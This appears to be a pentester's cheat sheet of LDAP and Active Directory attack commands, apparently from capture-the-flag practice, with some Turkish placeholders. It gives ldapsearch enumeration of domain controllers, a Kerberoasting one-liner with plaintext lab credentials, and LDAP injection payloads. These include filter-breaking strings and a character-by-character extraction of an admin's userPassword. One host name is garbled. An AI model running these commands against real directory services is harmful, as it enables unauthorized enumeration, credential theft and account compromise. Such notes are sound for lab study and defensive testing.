# Enumeration
```powershell
ldapsearch -x -H ldap://DC-IP/ -s base

ldapsearch -x -H ldap://DC-IP/ -s base namingcontexts

ldapsearch -x -H ldap://DC-IP/ -s base supportedsaslmechanisms

ldapsearch -x -H ldap://192.168.0.239 -s base subschemaSubentry

ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local"

ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w "password" -b "DC=domain,DC=local"

ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

# Kerberoasting
```powershell
nxc ldap 10.129.18.236 fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --kerberoasting output.txt
```

# LDAP Injection
```powershell
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "" -s base "(objectClass=*)"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=*)"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=admin*)" 
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(|(uid=admin*))"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" ")(uid=*))(|(uid=*"
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "*)(uid=*))(|(uid=*"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=a*)" 2>/dev/null
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=b*)" 2>/dev/null

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(&(uid=admin)(userPassword=a*))" 2>/dev/null
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(&(uid=admin)(userPassword=b*))" 2>/dev/null

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(objectClass=*)" +
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(cn=*)" "*"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(description=*)" 
ldapsearch -x -H "ldef-sunucu:389" -b "dc=hedef,dc=com" "(description=*)(|(cn=*))"
```
